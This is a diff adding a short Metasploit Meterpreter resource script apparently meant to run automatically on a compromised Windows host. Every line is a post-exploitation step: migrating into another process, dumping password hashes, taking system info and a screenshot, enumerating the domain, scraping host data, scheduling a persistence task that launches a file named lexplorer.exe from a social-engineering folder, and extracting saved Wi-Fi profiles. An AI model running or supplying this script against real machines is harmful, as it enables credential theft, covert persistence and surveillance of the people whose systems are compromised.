@@ -1,0 +1,9 @@
+run post/windows/manage/smart_migrate
+run post/windows/gather/smart_hashdump
+sysinfo
+screenshot
+run domain_list_gen
+run scraperlite
+
+run scheduleme -l -s -c /root/social_engineering/lexplorer.exe
+run post/windows/wlan/wlan_profile
